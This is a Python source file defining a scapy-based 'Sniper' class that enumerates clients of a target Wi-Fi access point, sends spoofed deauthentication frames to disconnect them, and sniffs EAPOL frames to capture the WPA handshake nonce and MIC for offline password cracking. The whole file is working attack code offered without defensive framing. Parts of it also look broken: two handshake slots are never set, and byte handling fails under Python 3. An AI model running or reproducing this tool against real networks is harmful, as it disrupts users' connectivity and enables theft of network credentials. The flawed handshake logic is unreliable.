import binascii
import threading
import time

from scapy.layers.dot11 import (
    Dot11,
    Dot11Deauth,
    RadioTap,
    Raw,
)
from scapy.layers.eap import EAPOL
from scapy.sendrecv import sendp, sniff

from utils import org


class Sniper:
    SNIFFER_STATUS = False
    CONNECTED_CLIENTS = {}
    CLIENT_COUNTER = {}
    HANDSHAKE_COUNTER = [0, 0, 0, 0]
    TARGET = ""
    OUT_FILTER = [
        "333300000016",
        "3333ff9ddffd",
        "ffffffffffff",
        "01005e7ffffa",
        "333300000001",
        "01005e0000fb",
    ]

    def __init__(
        self,
        iface_instance,
        bssid,
        essid,
        channel,
        timeout,
        pully,
        verbose,
    ):
        self.iface_instance = iface_instance
        self.iface = (
            self.iface_instance.iface
        )
        self.bssid = bssid
        self.essid = essid
        self.ch = channel
        self.timeout = timeout
        self.pull = pully
        self.verbose = verbose

    def __str__(self):
        return self.essid

    def channel_shifter(self):
        """Continuously shifts to the specified channel until stopped."""
        self.iface_instance.stop_hopper = 1
        while not self.iface_instance._interface__STATUS_END:
            time.sleep(1)
        self.iface_instance.shift_channel(
            self.ch
        )

    def clients_generator(self):
        """Starts sniffing for client packets."""
        try:
            sniff(
                iface=self.iface,
                prn=self.client_generator_replay,
            )
        except KeyboardInterrupt:
            self.report_clients()

    def client_generator_replay(self, pkt):
        """Processes packets received to build client list."""
        if (
            pkt.haslayer(Dot11)
            and pkt.getlayer(Dot11).type == 2
            and not pkt.haslayer(EAPOL)
        ):
            source = pkt.getlayer(
                Dot11
            ).addr2
            destination = pkt.getlayer(
                Dot11
            ).addr1
            if (
                source == self.bssid
                and source.replace(
                    ":", ""
                ).lower()
                not in self.OUT_FILTER
            ):
                self.process_client(
                    destination, pkt
                )
            elif (
                destination == self.bssid
                and destination.replace(
                    ":", ""
                ).lower()
                not in self.OUT_FILTER
            ):
                self.process_client(
                    source, pkt
                )

    def process_client(
        self, client_address, pkt
    ):
        """Updates CONNECTED_CLIENTS and CLIENT_COUNTER for given client."""
        if (
            client_address
            in self.CLIENT_COUNTER
        ):
            if (
                self.CLIENT_COUNTER[
                    client_address
                ]
                > 1
            ):
                self.CONNECTED_CLIENTS[
                    client_address
                ] = self.signal_strength(pkt)
        else:
            self.CLIENT_COUNTER[
                client_address
            ] = 1
            self.log_client_info(
                client_address, pkt
            )

    def log_client_info(
        self, client_address, pkt
    ):
        """Logs information about a connected client."""
        if self.verbose:
            self.pull.info(
                "Station %s (%s) %s<>%s %s (%s) %s[Data Frame]%s"
                % (
                    client_address.replace(
                        ":", ""
                    ).upper(),
                    self.pull.DARKCYAN
                    + org(client_address).org
                    + self.pull.END,
                    self.pull.RED,
                    self.pull.END,
                    pkt.getlayer(Dot11)
                    .addr2.replace(":", "")
                    .upper(),
                    self.pull.DARKCYAN
                    + org(
                        pkt.getlayer(
                            Dot11
                        ).addr2
                    ).org
                    + self.pull.END,
                    self.pull.YELLOW,
                    self.pull.END,
                )
            )
        else:
            self.pull.info(
                "Station %s %s<>%s %s %s[Data Frame]%s"
                % (
                    client_address.replace(
                        ":", ""
                    ).upper(),
                    self.pull.RED,
                    self.pull.END,
                    pkt.getlayer(Dot11)
                    .addr2.replace(":", "")
                    .upper(),
                    self.pull.YELLOW,
                    self.pull.END,
                )
            )

    def clients(self):
        """Returns connected clients sorted by signal strength."""
        powers = sorted(
            self.CONNECTED_CLIENTS.values(),
            reverse=True,
        )
        client_list = {self.bssid: []}
        for power in powers:
            for (
                client,
                sig_strength,
            ) in self.CONNECTED_CLIENTS.items():
                if (
                    sig_strength == power
                    and not (
                        client.startswith(
                            "33:33:"
                        )
                        or client.startswith(
                            "ff:ff:"
                        )
                    )
                ):
                    client_list[
                        self.bssid
                    ].append(
                        (
                            client,
                            sig_strength,
                        )
                    )
        return client_list

    def signal_strength(self, pkt):
        """Extracts the signal strength in dBm from a packet."""
        if pkt.haslayer(RadioTap):
            extra = pkt.notdecoded
            for p in extra:
                dbm_sig = -(256 - ord(p))
                if -90 < dbm_sig < -20:
                    return dbm_sig
        return -999

    def verify_handshake(self):
        """Checks if a handshake has been completed."""
        return all(
            count > 0
            for count in self.HANDSHAKE_COUNTER
        )

    def start_eapol_sniffer(self):
        """Starts sniffing for EAPOL packets."""
        self.SNIFFER_STATUS = True
        sniff(
            iface=self.iface,
            prn=self.eapol_sniffer_replay,
        )

    def eapol_sniffer_replay(self, pkt):
        """Processes EAPOL packets to capture handshake."""
        if pkt.haslayer(EAPOL):
            source = pkt[Dot11].addr2
            destination = pkt[Dot11].addr1
            from_ds = (
                pkt.getlayer(Dot11).FCfield
                & 0x2
                != 0
            )
            to_ds = (
                pkt.getlayer(Dot11).FCfield
                & 0x1
                != 0
            )

            tgt = (
                source
                if source == self.bssid
                else destination
                if destination == self.bssid
                else None
            )
            if tgt is None:
                return

            self.process_handshake(
                pkt,
                source,
                destination,
                from_ds,
                to_ds,
            )

    def process_handshake(
        self,
        pkt,
        source,
        destination,
        from_ds,
        to_ds,
    ):
        """Extracts nonce and MIC, and updates handshake counter."""
        nonce = binascii.hexlify(
            pkt.getlayer(Raw).load
        )[26:90]
        mic = binascii.hexlify(
            pkt.getlayer(Raw).load
        )[154:186]
        target_nonce = "0000000000000000000000000000000000000000000000000000000000000000"
        target_mic = "00000000000000000000000000000000"

        if from_ds:
            if (
                source == self.bssid
                and nonce != target_nonce
            ):
                self.HANDSHAKE_COUNTER[0] = (
                    pkt
                    if mic == target_mic
                    else self.HANDSHAKE_COUNTER[
                        2
                    ]
                )

        elif to_ds:
            if (
                destination == self.bssid
                and nonce != target_nonce
            ):
                self.HANDSHAKE_COUNTER[1] = (
                    pkt
                    if mic != target_mic
                    else self.HANDSHAKE_COUNTER[
                        3
                    ]
                )

    def shoot(
        self,
        target,
        deauth_count,
        phaz_instance,
    ):
        """Sends deauthentication packets to a target."""
        self.TARGET = target
        if not self.SNIFFER_STATUS:
            threading.Thread(
                target=self.start_eapol_sniffer,
                daemon=True,
            ).start()

        while not self.SNIFFER_STATUS:
            time.sleep(1)

        deauth_packet_to_client = (
            RadioTap()
            / Dot11(
                addr1=target,
                addr2=self.bssid,
                addr3=self.bssid,
            )
            / Dot11Deauth(reason=7)
        )
        deauth_packet_to_ap = (
            RadioTap()
            / Dot11(
                addr1=self.bssid,
                addr2=target,
                addr3=target,
            )
            / Dot11Deauth(reason=7)
        )

        for _ in range(deauth_count):
            sendp(
                deauth_packet_to_client,
                iface=self.iface,
                count=1,
                verbose=False,
            )
            sendp(
                deauth_packet_to_ap,
                iface=self.iface,
                count=1,
                verbose=False,
            )

        if self.verify_handshake():
            phaz_instance.THEPOL = tuple(
                self.HANDSHAKE_COUNTER
            )
